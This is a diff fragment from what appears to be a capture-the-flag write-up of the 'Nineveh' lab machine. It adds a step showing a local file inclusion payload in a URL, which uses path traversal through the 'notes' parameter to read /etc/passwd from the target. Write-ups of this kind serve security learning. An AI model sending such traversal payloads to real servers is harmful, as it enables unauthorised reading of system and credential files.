@@ -479,3 +479,10 @@ http://10.10.10.43/department/manage.php?notes=files/ninevehNotes.txt.txt
 ![16](../../../assets/images/Nineveh/16.png)
 
 <br />
+
+After several tries, we figure out a way that allows us to include internal files from the victim machine:
+
+```bash
+http://10.10.10.43/department/manage.php?notes=/ninevehNotes/../etc/passwd
+```
+![17](../../../assets/images/Nineveh/17.png)
